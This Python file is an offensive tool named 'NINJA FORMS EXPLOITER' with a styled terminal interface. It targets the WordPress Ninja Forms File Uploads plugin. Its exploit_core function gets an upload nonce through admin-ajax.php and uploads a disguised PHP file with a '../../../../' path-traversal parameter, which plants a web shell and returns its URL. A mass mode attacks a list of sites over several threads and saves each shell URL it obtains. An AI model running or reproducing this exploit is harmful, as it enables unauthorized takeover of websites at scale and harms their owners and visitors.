#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NINJA FORMS EXPLOITER
Terminal UI Edition — Dark Cyberpunk / Hacker Terminal theme.

UI redesign only. Exploit flow, endpoints, algorithms and result-file
format are intentionally unchanged.
"""

import requests
import re
import json
import random
import pathlib
import urllib3
import os
import sys
import time
import platform
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# 0. Terminal bootstrap (UTF-8 + ANSI capability detection)
# ============================================================
if os.name == "nt":
    os.system("chcp 65001 >nul 2>&1")

try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
    sys.stdin.reconfigure(encoding="utf-8")
except Exception:
    pass

ANSI_SUPPORTED = False
COLOR_DEPTH = 0          # 0 = none, 4 = 16-color, 8 = 256-color, 24 = truecolor


def _enable_windows_vt():
    """Enable Virtual Terminal Processing on modern Windows consoles."""
    try:
        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        kernel32.GetStdHandle.restype = wintypes.HANDLE
        kernel32.GetStdHandle.argtypes = [wintypes.DWORD]
        kernel32.GetConsoleMode.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
        kernel32.SetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.DWORD]

        enabled = False
        for handle_id in (-11, -12):          # stdout, stderr
            handle = kernel32.GetStdHandle(handle_id)
            mode = wintypes.DWORD()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                if kernel32.SetConsoleMode(handle, mode.value | 0x0004):
                    enabled = True
        return enabled
    except Exception:
        return False


def _detect_color_depth():
    colorterm = os.environ.get("COLORTERM", "").lower()
    term = os.environ.get("TERM", "").lower()
    term_program = os.environ.get("TERM_PROGRAM", "").lower()

    if colorterm in ("truecolor", "24bit"):
        return 24
    if os.environ.get("WT_SESSION") or term_program in ("vscode", "iterm.app", "wezterm", "hyper"):
        return 24
    if "256color" in term:
        return 8
    if os.name == "nt":
        return 8
    return 8 if term else 4


def _detect_ansi():
    """Central ANSI gate: NO_COLOR, non-TTY and legacy consoles disable color."""
    global ANSI_SUPPORTED, COLOR_DEPTH

    force = os.environ.get("FORCE_COLOR", "").lower() in ("1", "true", "yes", "always", "force")

    if os.environ.get("NO_COLOR") is not None and not force:
        ANSI_SUPPORTED, COLOR_DEPTH = False, 0
        return

    try:
        is_tty = sys.stdout.isatty()
    except Exception:
        is_tty = False

    if not is_tty and not force:
        ANSI_SUPPORTED, COLOR_DEPTH = False, 0
        return

    if os.name == "nt":
        if not _enable_windows_vt() and not force:
            ANSI_SUPPORTED, COLOR_DEPTH = False, 0
            return

    if os.environ.get("TERM", "").lower() == "dumb" and not force:
        ANSI_SUPPORTED, COLOR_DEPTH = False, 0
        return

    ANSI_SUPPORTED = True
    COLOR_DEPTH = _detect_color_depth()


_detect_ansi()

# ============================================================
# 1. Centralized ANSI color system
# ============================================================
ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")

_ANSI16_RGB = (
    (30, (0, 0, 0)),        (31, (128, 0, 0)),
    (32, (0, 128, 0)),      (33, (128, 128, 0)),
    (34, (0, 0, 128)),      (35, (128, 0, 128)),
    (36, (0, 128, 128)),    (37, (192, 192, 192)),
    (90, (128, 128, 128)),  (91, (255, 0, 0)),
    (92, (0, 255, 0)),      (93, (255, 255, 0)),
    (94, (0, 0, 255)),      (95, (255, 0, 255)),
    (96, (0, 255, 255)),    (97, (255, 255, 255)),
)


def _sgr(code):
    return "\033[{}m".format(code) if ANSI_SUPPORTED else ""


def _rgb_to_16(r, g, b, bg=False):
    """Nearest legacy 16-color SGR code."""
    best = min(
        _ANSI16_RGB,
        key=lambda item: (item[1][0] - r) ** 2 + (item[1][1] - g) ** 2 + (item[1][2] - b) ** 2,
    )
    code = best[0] + (10 if bg else 0)
    return code


def _xterm_to_rgb(code):
    """Convert xterm-256 index to RGB."""
    base = (
        (0, 0, 0), (128, 0, 0), (0, 128, 0), (128, 128, 0),
        (0, 0, 128), (128, 0, 128), (0, 128, 128), (192, 192, 192),
        (128, 128, 128), (255, 0, 0), (0, 255, 0), (255, 255, 0),
        (0, 0, 255), (255, 0, 255), (0, 255, 255), (255, 255, 255),
    )
    if code < 16:
        return base[code]
    if code < 232:
        code -= 16
        r = code // 36
        g = (code % 36) // 6
        b = code % 6
        steps = (0, 95, 135, 175, 215, 255)
        return steps[r], steps[g], steps[b]
    v = 8 + (code - 232) * 10
    return v, v, v


def _rgb_to_256(r, g, b):
    if r == g == b:
        if r < 8:
            return 16
        if r > 248:
            return 231
        return round(((r - 8) / 247) * 24) + 232
    return 16 + 36 * round(r / 255 * 5) + 6 * round(g / 255 * 5) + round(b / 255 * 5)


def c256(code, bg=False):
    """xterm-256 color with graceful 16-color fallback."""
    if not ANSI_SUPPORTED:
        return ""
    code = max(0, min(255, int(code)))
    if COLOR_DEPTH >= 8:
        return "\033[{};5;{}m".format(48 if bg else 38, code)
    r, g, b = _xterm_to_rgb(code)
    return _sgr(_rgb_to_16(r, g, b, bg))


def rgb(r, g, b, bg=False):
    """Truecolor with automatic 256/16-color fallback."""
    if not ANSI_SUPPORTED:
        return ""
    r, g, b = (max(0, min(255, int(v))) for v in (r, g, b))
    if COLOR_DEPTH >= 24:
        return "\033[{};2;{};{};{}m".format(48 if bg else 38, r, g, b)
    if COLOR_DEPTH >= 8:
        return c256(_rgb_to_256(r, g, b), bg)
    return _sgr(_rgb_to_16(r, g, b, bg))


# ---- Core SGR attributes -----------------------------------
RESET          = _sgr("0")
BOLD           = _sgr("1")
DIM            = _sgr("2")
ITALIC         = _sgr("3")
UNDERLINE      = _sgr("4")
REVERSE        = _sgr("7")

# ---- Base + bright colors ----------------------------------
BLACK          = _sgr("30")
RED            = _sgr("31")
GREEN          = _sgr("32")
YELLOW         = _sgr("33")
BLUE           = _sgr("34")
MAGENTA        = _sgr("35")
CYAN           = _sgr("36")
WHITE          = _sgr("37")
GRAY           = c256(244)
BRIGHT_RED     = _sgr("91")
BRIGHT_GREEN   = _sgr("92")
BRIGHT_YELLOW  = _sgr("93")
BRIGHT_BLUE    = _sgr("94")
BRIGHT_MAGENTA = _sgr("95")
BRIGHT_CYAN    = _sgr("96")
BRIGHT_WHITE   = _sgr("97")
PURPLE         = c256(135)

# ---- Background colors -------------------------------------
BG_BLACK       = _sgr("40")
BG_RED         = _sgr("41")
BG_GREEN       = _sgr("42")
BG_YELLOW      = _sgr("43")
BG_BLUE        = _sgr("44")
BG_MAGENTA     = _sgr("45")
BG_CYAN        = _sgr("46")
BG_WHITE       = _sgr("47")

# ============================================================
# 2. Theme palette (Cyan -> Blue -> Purple)
# ============================================================
THEME_C1 = (0, 229, 255)     # cyan
THEME_C2 = (0, 110, 255)     # electric blue
THEME_C3 = (150, 60, 255)    # violet / purple
THEME_STOPS = (THEME_C1, THEME_C2, THEME_C3)

PAL_OK  = ((0, 235, 170), (0, 190, 255))
PAL_BAD = ((255, 70, 110), (150, 0, 90))
PAL_MAG = (THEME_C1, THEME_C3)
PAL_BLU = ((0, 150, 255), THEME_C1)

C_INFO = (90, 190, 255)
C_OK   = (0, 235, 150)
C_ERR  = (255, 70, 100)
C_WARN = (255, 190, 60)
C_TIP  = (170, 110, 255)

APP_NAME    = "NINJA FORMS EXPLOITER"
APP_VERSION = "v2.0.0"
APP_AUTHOR  = "BstnHxr1337"
APP_CONTACT = "https://t.me/BastianHxr13"
APP_DESC    = "Ninja Forms File Uploads - Exploit & Mass Scanner"

# Status color mapping (single source of truth)
STATUS_MAP = {
    "SUCCESS":   BRIGHT_GREEN,
    "ERROR":     BRIGHT_RED,
    "FAILED":    BRIGHT_RED,
    "WARNING":   YELLOW,
    "INFO":      CYAN,
    "SCANNING":  BLUE,
    "CRITICAL":  RED,
    "HIGH":      BRIGHT_RED,
    "MEDIUM":    YELLOW,
    "LOW":       GREEN,
    "COMPLETED": BRIGHT_GREEN,
}

# ============================================================
# 3. Gradient / text helpers
# ============================================================
def gradient(text, start=55, end=207, bg=False):
    """256-color gradient that preserves display width."""
    if not text or not ANSI_SUPPORTED:
        return text
    n = max(len(text) - 1, 1)
    return "".join(c256(start + (end - start) * i // n, bg) + ch for i, ch in enumerate(text)) + RESET


def rgb_gradient(text, c1, c2):
    """Truecolor gradient between two RGB tuples (auto-fallback)."""
    if not text or not ANSI_SUPPORTED:
        return text
    r1, g1, b1 = c1
    r2, g2, b2 = c2
    n = max(len(text) - 1, 1)
    out = []
    for i, ch in enumerate(text):
        r = r1 + (r2 - r1) * i // n
        g = g1 + (g2 - g1) * i // n
        b = b1 + (b2 - b1) * i // n
        out.append(rgb(r, g, b) + ch)
    return "".join(out) + RESET


def multi_gradient(text, colors=THEME_STOPS, bg=False):
    """Multi-stop gradient (cyan -> blue -> purple)."""
    if not text or not ANSI_SUPPORTED:
        return text
    colors = list(colors)
    if len(colors) == 1:
        colors.append(colors[0])
    n = max(len(text) - 1, 1)
    segs = len(colors) - 1
    out = []
    for i, ch in enumerate(text):
        pos = (i / n) * segs
        idx = min(int(pos), segs - 1)
        t = pos - idx
        c1, c2 = colors[idx], colors[idx + 1]
        r = int(c1[0] + (c2[0] - c1[0]) * t)
        g = int(c1[1] + (c2[1] - c1[1]) * t)
        b = int(c1[2] + (c2[2] - c1[2]) * t)
        out.append(rgb(r, g, b, bg) + ch)
    return "".join(out) + RESET


def lerp(c1, c2, t):
    return tuple(int(c1[i] + (c2[i] - c1[i]) * t) for i in range(3))


def neon(text, c1=THEME_C1, c2=THEME_C2, bold=True):
    return (BOLD if bold else "") + multi_gradient(text, [c1, c2])


def _visible_len(text):
    return len(ANSI_RE.sub("", text))


def _truncate(text, width):
    """ANSI-aware truncation."""
    if _visible_len(text) <= width:
        return text
    if width <= 1:
        return "…"[:max(width, 0)]
    out, visible, i = [], 0, 0
    while i < len(text) and visible < width - 1:
        match = ANSI_RE.match(text, i)
        if match:
            out.append(match.group(0))
            i = match.end()
            continue
        out.append(text[i])
        visible += 1
        i += 1
    out.append("…")
    if ANSI_SUPPORTED:
        out.append(RESET)
    return "".join(out)


def _fit(text, width, align="left"):
    """Pad / truncate text to an exact visible width."""
    text = "" if text is None else str(text)
    if width <= 0:
        return ""
    if _visible_len(text) > width:
        text = _truncate(text, width)
    pad = max(width - _visible_len(text), 0)
    tail = RESET if ANSI_SUPPORTED else ""
    if align == "right":
        return " " * pad + text
    if align == "center":
        left = pad // 2
        return " " * left + text + tail + " " * (pad - left)
    return text + tail + " " * pad


# ============================================================
# 4. Layout primitives
# ============================================================
WIDTH = 68
INDENT = "  "
PRINT_LOCK = threading.Lock()


def tprint(*args, **kwargs):
    with PRINT_LOCK:
        print(*args, **kwargs)


def clear():
    if ANSI_SUPPORTED:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()
        return
    try:
        if not sys.stdout.isatty():
            return
    except Exception:
        return
    os.system("cls" if os.name == "nt" else "clear")


def _ts():
    return f"{DIM}[{time.strftime('%H:%M:%S')}]{RESET}"


def divider(c1=THEME_C1, c2=THEME_C3, char="─"):
    print(INDENT + rgb_gradient(char * WIDTH, c1, c2))


def box_top(c1=THEME_C1, c2=THEME_C2):
    print(INDENT + BOLD + rgb_gradient("╔" + "═" * (WIDTH - 2) + "╗", c1, c2))


def box_bottom(c1=THEME_C1, c2=THEME_C2):
    print(INDENT + BOLD + rgb_gradient("╚" + "═" * (WIDTH - 2) + "╝", c1, c2))


def box_line(text="", border=(THEME_C1, THEME_C2), align="left"):
    c1, c2 = border
    inner = WIDTH - 4
    text = _fit(text, inner, align)
    b1 = f"{BOLD}{rgb(*c1)}║{RESET}"
    b2 = f"{BOLD}{rgb(*c2)}║{RESET}"
    print(f"{INDENT}{b1} {text} {b2}")


def panel(title, items, palette=PAL_BLU):
    c1, c2 = palette
    box_top(c1, c2)
    box_line(neon(title, c1, c2), border=(c1, c2), align="center")
    box_line(f"{DIM}{'─' * (WIDTH - 4)}{RESET}", border=(c1, c2))
    for key, value in items:
        box_line(f"{GRAY}{_fit(str(key), 15)}{RESET} {WHITE}{value}{RESET}", border=(c1, c2))
    box_bottom(c1, c2)


def table(headers, rows, title=None, palette=PAL_BLU):
    """ANSI-aware box table with auto-sized columns."""
    c1, c2 = palette
    inner = WIDTH - 4
    gap = "  "
    n = len(headers)
    rows = [[str(cell) for cell in row] for row in rows]

    widths = []
    for i, header in enumerate(headers):
        width = _visible_len(str(header))
        for row in rows:
            if i < len(row):
                width = max(width, _visible_len(row[i]))
        widths.append(max(width, 4))

    available = inner - len(gap) * (n - 1)
    while sum(widths) > available:
        idx = max(range(n), key=lambda i: widths[i])
        if widths[idx] <= 6:
            break
        widths[idx] -= 1

    leftover = inner - (sum(widths) + len(gap) * (n - 1))
    if leftover > 0:
        widths[-1] += leftover

    box_top(c1, c2)
    if title:
        box_line(neon(title, c1, c2), border=(c1, c2), align="center")
        box_line(f"{DIM}{'─' * inner}{RESET}", border=(c1, c2))

    head = "".join(
        _fit(str(header), widths[i], "left") + (gap if i < n - 1 else "")
        for i, header in enumerate(headers)
    )
    box_line(f"{BOLD}{BRIGHT_CYAN}{head}{RESET}", border=(c1, c2))
    box_line(f"{DIM}{'─' * inner}{RESET}", border=(c1, c2))

    for row in rows:
        cells = [
            _fit(row[i] if i < len(row) else "", widths[i], "left")
            for i in range(n)
        ]
        box_line(f"{WHITE}{gap.join(cells)}{RESET}", border=(c1, c2))

    box_bottom(c1, c2)


def section_header(title, subtitle=""):
    print()
    line = INDENT + f"{BRIGHT_CYAN}{BOLD}◆ {title.upper()}{RESET}"
    if subtitle:
        line += f"  {DIM}{subtitle}{RESET}"
    print(line)
    print(INDENT + rgb_gradient("─" * WIDTH, (30, 80, 140), THEME_C3))


def footer(note=""):
    print()
    divider((30, 60, 110), (80, 40, 140))
    left = f"{DIM}{APP_NAME} {APP_VERSION}{RESET}"
    right = f"{DIM}{time.strftime('%H:%M:%S')} · {platform.system()}{RESET}"
    padding = max(WIDTH - _visible_len(left) - _visible_len(right), 1)
    print(INDENT + left + " " * padding + right)
    if note:
        print(INDENT + f"{DIM}{note}{RESET}")


# ============================================================
# 5. ASCII banner
# ============================================================
LOGO_FONT = {
    "N": ["█   █", "██  █", "█ █ █", "█  ██", "█   █"],
    "1": [" ██  ", "  █  ", "  █  ", "  █  ", " ███ "],
    "Z": ["█████", "   █ ", "  █  ", " █   ", "█████"],
    "4": ["█   █", "█   █", "█████", "    █", "    █"],
    " ": ["     "] * 5,
}
LOGO_FONT_ROWS = 5
LOGO_FONT_BLANK = " " * 5


def render_logo(word):
    lines = []
    for row in range(LOGO_FONT_ROWS):
        line = ""
        for char in word.upper():
            glyph = LOGO_FONT.get(char, [LOGO_FONT_BLANK] * LOGO_FONT_ROWS)
            line += glyph[row] + " "
        lines.append(line.rstrip())
    return lines


def banner():
    clear()
    print()
    divider((40, 60, 110), THEME_C3)
    print()

    logo = render_logo("N1NZ4")
    logo_width = max(len(line) for line in logo)
    pad = " " * (len(INDENT) + max((WIDTH - logo_width) // 2, 0))
    for line in logo:
        print(pad + BOLD + multi_gradient(line, THEME_STOPS))
    print()

    box_top(*PAL_MAG)
    box_line(f"{WHITE}{BOLD}{APP_NAME}{RESET}", border=PAL_MAG, align="center")
    box_line(
        multi_gradient("CYBER SECURITY RESEARCH TOOLKIT", (THEME_C1, THEME_C3)),
        border=PAL_MAG,
        align="center",
    )
    box_line(f"{DIM}{'─' * (WIDTH - 4)}{RESET}", border=PAL_MAG)
    box_line(
        f"{GRAY}Author{RESET}  {WHITE}{APP_AUTHOR}{RESET}    "
        f"{GRAY}Version{RESET}  {BRIGHT_CYAN}{APP_VERSION}{RESET}",
        border=PAL_MAG,
    )
    box_line(
        f"{GRAY}Contact{RESET} {rgb_gradient(APP_CONTACT, THEME_C1, THEME_C3)}",
        border=PAL_MAG,
    )
    box_line(f"{DIM}{APP_DESC}{RESET}", border=PAL_MAG)
    box_bottom(*PAL_MAG)
    print()

    if COLOR_DEPTH >= 24:
        depth = "TRUECOLOR"
    elif COLOR_DEPTH >= 8:
        depth = "256-COLOR"
    elif ANSI_SUPPORTED:
        depth = "16-COLOR"
    else:
        depth = "PLAIN"

    print(
        INDENT
        + f"{GRAY}ENGINE{RESET} {BRIGHT_CYAN}●{RESET} {DIM}{depth}{RESET}   "
        + f"{GRAY}UTF-8{RESET} {BRIGHT_GREEN}●{RESET}   "
        + f"{GRAY}CORE{RESET} {BRIGHT_BLUE}●{RESET}"
    )
    print()


# ============================================================
# 6. Notifications / status / prompt
# ============================================================
def _badge(color, symbol):
    return f"{rgb(*color, bg=True)}{BOLD}{WHITE} {symbol} {RESET}"


def _notify(level, symbol, msg, color, ansi_color):
    print(
        f"  {_ts()} {_badge(color, symbol)} "
        f"{ansi_color}{BOLD}{level:<7}{RESET} {ansi_color}{msg}{RESET}"
    )


def info(msg):
    _notify("INFO", "i", msg, C_INFO, CYAN)


def success(msg):
    _notify("SUCCESS", "+", msg, C_OK, BRIGHT_GREEN)


def error(msg):
    _notify("ERROR", "x", msg, C_ERR, BRIGHT_RED)


def warn(msg):
    _notify("WARNING", "!", msg, C_WARN, YELLOW)


def tip(msg):
    _notify("TIP", "?", msg, C_TIP, PURPLE)


def status_tag(status):
    color = STATUS_MAP.get(status.upper(), GRAY)
    return f"{color}{BOLD}[{status.upper()}]{RESET}"


def scan_status(msg, extra=""):
    line = f"  {_ts()} {status_tag('SCANNING')} {WHITE}{msg}{RESET}"
    if extra:
        line += f" {DIM}{extra}{RESET}"
    print(line)


def result_counter(ok, failed):
    return (
        f"{BRIGHT_GREEN}{BOLD}▲ {ok}{RESET} {DIM}ok{RESET}   "
        f"{BRIGHT_RED}{BOLD}▼ {failed}{RESET} {DIM}fail{RESET}"
    )


def prompt(label, default=""):
    suffix = f" {DIM}({default}){RESET}" if default else ""
    arrow = f"{BRIGHT_CYAN}{BOLD}❯{RESET}"
    return input(f"  {arrow} {WHITE}{BOLD}{label}{RESET}{suffix}{DIM}:{RESET} ").strip()


# ============================================================
# 7. Progress bar / live statistics / spinner
# ============================================================
def progress_bar(done, total, width=24):
    frac = min(done / total, 1.0) if total else 0.0
    filled = int(round(width * frac))
    block = multi_gradient("█" * filled, (C_OK, THEME_C1, THEME_C3)) if filled else ""
    empty = f"{DIM}{'░' * (width - filled)}{RESET}"
    return f"{block}{empty}"


def live_stats(done, total, ok, failed, elapsed=None):
    pct = int(round(done / total * 100)) if total else 0
    parts = [
        progress_bar(done, total, 18),
        f"{WHITE}{BOLD}{done}/{total}{RESET}",
        f"{DIM}({pct:>3}%){RESET}",
        result_counter(ok, failed),
    ]
    if elapsed is not None:
        parts.append(f"{GRAY}{elapsed:.1f}s{RESET}")
    return "  ".join(parts)


class Spinner:
    FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, msg, c1=THEME_C1, c2=THEME_C3):
        self.msg = msg
        self.c1 = c1
        self.c2 = c2
        self.stop = False
        self.thread = None
        self.start = 0.0

    def _spin(self):
        if not ANSI_SUPPORTED:
            with PRINT_LOCK:
                print(f"  {DIM}{self.msg}...{RESET}")
            return

        i = 0
        self.start = time.time()
        n = len(self.FRAMES)
        while not self.stop:
            frame = self.FRAMES[i % n]
            col = rgb(*lerp(self.c1, self.c2, (i % n) / n))
            elapsed = time.time() - self.start
            with PRINT_LOCK:
                sys.stdout.write(
                    "\r\033[K"
                    f"  {col}{BOLD}{frame}{RESET} "
                    f"{WHITE}{self.msg}{RESET} "
                    f"{DIM}[{elapsed:.1f}s]{RESET}"
                )
                sys.stdout.flush()
            time.sleep(0.08)
            i += 1

        with PRINT_LOCK:
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()

    def __enter__(self):
        self.thread = threading.Thread(target=self._spin, daemon=True)
        self.thread.start()
        return self

    def __exit__(self, *exc):
        self.stop = True
        if self.thread:
            self.thread.join()


# ============================================================
# 8. Core exploit (UNCHANGED)
# ============================================================
def exploit_core(target_url, form_id, field_id, file_path, timeout=20):
    target_url = (target_url or "").strip()
    # Samakan dengan 1.py: normalisasi URL
    if target_url and not target_url.startswith("http"):
        target_url = "http://" + target_url
    target_url = target_url.rstrip("/")
    if not target_url:
        return {"ok": False, "target": target_url, "error": "empty target"}
    ajax_url = f"{target_url}/wp-admin/admin-ajax.php"
    filename = os.path.basename(file_path)

    # Samakan dengan x.py
    if not field_id:
        field_id = "35"
    if not form_id:
        form_id = field_id

    param_traversal = filename.replace(".", "_")

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0",
    }
    try:
        # Langkah 1: ambil nonce (seperti x.py)
        nonce_payload = {
            "action": "nf_fu_get_new_nonce",
            "field_id": field_id,
            "form_id": form_id,
        }

        r_nonce = requests.post(ajax_url, data=nonce_payload, headers=headers, verify=False, timeout=10)
        res_text = r_nonce.text
        match = re.search(r"(\{.*\})", res_text)
        if not match:
            return {"ok": False, "target": target_url, "error": "no nonce json", "status": r_nonce.status_code, "body": res_text}
        try:
            nonce_json = json.loads(match.group(1))
        except Exception:
            return {"ok": False, "target": target_url, "error": "invalid nonce json", "status": r_nonce.status_code, "body": res_text}

        nonce = nonce_json.get("data", {}).get("nonce")
        if not nonce:
            return {"ok": False, "target": target_url, "error": "no nonce", "status": r_nonce.status_code, "body": res_text}

        # Langkah 2: upload (seperti x.py)
        with open(file_path, "rb") as f:
            file_bytes = f.read()

        files = {
            f"files-{field_id}[]": (filename, file_bytes, "application/octet-stream")
        }
        data = {
            "action": "nf_fu_upload",
            "nonce": nonce,
            "form_id": form_id,
            "field_id": field_id,
            param_traversal: f"../../../../{filename.replace('.jpg', '')}",
        }

        response = requests.post(ajax_url, data=data, files=files, headers=headers, verify=False, timeout=15)

        if '"error":0' in response.text:
            shell_name = filename.replace(".jpg", "")
            shell_url = f"{target_url}/{shell_name}"
            return {"ok": True, "target": target_url, "shell_url": shell_url, "status": response.status_code, "body": response.text}
        return {"ok": False, "target": target_url, "error": "upload failed", "status": response.status_code, "body": response.text}
    except Exception as e:
        return {"ok": False, "target": target_url, "error": str(e)}


def verify_shell(shell_url, timeout=15):
    """Pastikan shell benar-benar terupload/terakses sebelum disimpan."""
    try:
        r = requests.get(shell_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False


# ============================================================
# 9. Single mode
# ============================================================
def run_single():
    banner()
    section_header("single target mode", "one shot exploitation")

    target_url = prompt("Target URL (e.g., https://site.com)").rstrip("/")
    form_id = prompt("Form ID")
    field_id = prompt("Field ID")
    file_path = prompt("Path File Lokal (e.g., shell.php.jpg)")

    if not os.path.exists(file_path):
        error("File lokal tidak ditemukan!")
        footer()
        return

    info(f"Target: {target_url}")

    with Spinner("Menjalankan exploit..."):
        result = exploit_core(target_url, form_id, field_id, file_path)

    print()
    if result.get("ok"):
        shell_url = result["shell_url"]
        success("Exploit berhasil!")
        body = (result.get("body") or "").strip()
        if len(body) > 48:
            body = body[:48] + "…"
        table(
            ["FIELD", "VALUE"],
            [
                ["Target", target_url],
                ["Status Code", str(result.get("status"))],
                ["Response", body or "-"],
                ["Shell URL", shell_url],
            ],
            title="HASIL UPLOAD",
            palette=PAL_OK,
        )
        print()
        print(INDENT + f"{BRIGHT_GREEN}{BOLD}▶ SHELL URL{RESET}")
        print(INDENT + rgb_gradient(shell_url, C_OK, THEME_C1))
    else:
        error(f"Upload gagal: {result.get('error')}")
        print()
        items = []
        if result.get("status"):
            items.append(["Status Code", str(result.get("status"))])
        body = (result.get("body") or "").strip()
        if body:
            if len(body) > 48:
                body = body[:48] + "…"
            items.append(["Response", body])
        if items:
            table(["FIELD", "VALUE"], items, title="DETAIL GAGAL", palette=PAL_BAD)
        tip("Pastikan target menggunakan Ninja Forms File Uploads <= 3.3.26.")

    footer()
    print()


# ============================================================
# 10. Mass mode
# ============================================================
def run_mass():
    banner()
    section_header("mass target mode", "batch exploitation")

    targets_file = prompt("Target List (txt)", "targets.txt")
    if not os.path.exists(targets_file):
        error("File target tidak ditemukan!")
        footer()
        return
    with open(targets_file, "r", encoding="utf-8") as f:
        targets = [ln.strip() for ln in f if ln.strip()]
    if not targets:
        error("Daftar target kosong!")
        footer()
        return

    form_id = prompt("Form ID")
    field_id = prompt("Field ID")
    file_path = prompt("Path File (e.g., shell.php.jpg)", "shell.php.jpg")
    if not os.path.exists(file_path):
        error("File payload tidak ditemukan!")
        footer()
        return

    try:
        threads = int(prompt("Threads", "5") or "5")
    except ValueError:
        threads = 5
    if threads < 1:
        threads = 1

    result_file = prompt("File hasil", "mass_success.txt")

    print()
    panel(
        "KONFIGURASI MASS",
        [
            ("Total targets", str(len(targets))),
            ("Threads", str(threads)),
            ("File hasil", result_file),
        ],
        palette=PAL_BLU,
    )
    print()

    # reset result file
    try:
        open(result_file, "w", encoding="utf-8").close()
    except Exception:
        pass

    result_lock = threading.Lock()
    success_count = {"n": 0}
    fail_count = {"n": 0}
    done_count = {"n": 0}
    total = len(targets)
    started = time.time()

    scan_status("Mass scan dimulai", f"{total} target · {threads} threads")
    print()

    def worker(t):
        nonlocal success_count, fail_count, done_count
        res = exploit_core(t, form_id, field_id, file_path, 20)
        with result_lock:
            done_count["n"] += 1
            dn = done_count["n"]
            elapsed = time.time() - started
            if res.get("ok"):
                shell_url = res["shell_url"]
                # Verifikasi shell benar-benar terupload sebelum disimpan
                success_count["n"] += 1
                tprint(f"  {_ts()} {status_tag('SUCCESS')} {WHITE}{res['target']}{RESET}")
                tprint(f"      {DIM}↳{RESET} {rgb_gradient(shell_url, C_OK, THEME_C1)}")
                try:
                    with open(result_file, "a", encoding="utf-8") as rf:
                        rf.write(f"[+] SUCCESS: {shell_url}\n")
                except Exception:
                    pass
            else:
                fail_count["n"] += 1
                tprint(
                    f"  {_ts()} {status_tag('ERROR')} {WHITE}{res['target']}{RESET} "
                    f"{DIM}({res.get('error')}){RESET}"
                )
            # live progress + counters
            tprint(
                f"  {live_stats(dn, total, success_count['n'], fail_count['n'], elapsed)}"
            )
        return res

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(worker, t) for t in targets]
        for _ in as_completed(futures):
            pass

    elapsed = time.time() - started
    print()
    palette = PAL_OK if success_count["n"] else PAL_BAD
    table(
        ["METRIC", "VALUE"],
        [
            ["Total", str(total)],
            ["Success", str(success_count["n"])],
            ["Failed", str(fail_count["n"])],
            ["Hasil", result_file],
        ],
        title="RINGKASAN MASS",
        palette=palette,
    )
    print()
    print(INDENT + f"{DIM}Durasi{RESET}  {WHITE}{BOLD}{elapsed:.1f}s{RESET}   "
          + result_counter(success_count["n"], fail_count["n"]))
    footer()
    print()


# ============================================================
# 11. Main menu
# ============================================================
def main_menu():
    entries = [
        ("1", "Single Target", "exploit satu URL langsung"),
        ("2", "Mass Target", "serang banyak target dari file"),
    ]

    while True:
        banner()
        section_header("main menu", "pilih operasi")

        box_top(*PAL_BLU)
        for num, name, desc in entries:
            line = (
                f"{BRIGHT_CYAN}{BOLD}[{num}]{RESET}  "
                f"{WHITE}{BOLD}{name:<16}{RESET} {DIM}{desc}{RESET}"
            )
            box_line(line, border=PAL_BLU)
        box_line(f"{DIM}{'─' * (WIDTH - 4)}{RESET}", border=PAL_BLU)
        box_line(
            f"{RED}{BOLD}[0]{RESET}  {GRAY}{'Exit':<16}{RESET} {DIM}tutup tools{RESET}",
            border=PAL_BLU,
        )
        box_bottom(*PAL_BLU)

        print()
        print(
            INDENT
            + f"{DIM}SHORTCUT{RESET}  "
            + f"{WHITE}1{RESET} single   "
            + f"{WHITE}2{RESET} mass   "
            + f"{WHITE}0{RESET} exit   "
            + f"{DIM}Ctrl+C batal{RESET}"
        )
        footer()
        print()

        choice = prompt("Pilih menu")
        if choice == "1":
            run_single()
            _pause()
        elif choice == "2":
            run_mass()
            _pause()
        elif choice in ("0", "q", "exit", "quit"):
            print()
            print(INDENT + neon("Sampai jumpa, ninja!  🥷", THEME_C1, THEME_C3))
            print()
            break
        else:
            error("Pilihan tidak valid.")
            time.sleep(1)


def _pause():
    print()
    try:
        input(f"  {DIM}Tekan Enter untuk kembali ke menu…{RESET}")
    except (EOFError, KeyboardInterrupt):
        pass


if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print()
        warn("Dibatalkan oleh user.")
    print()
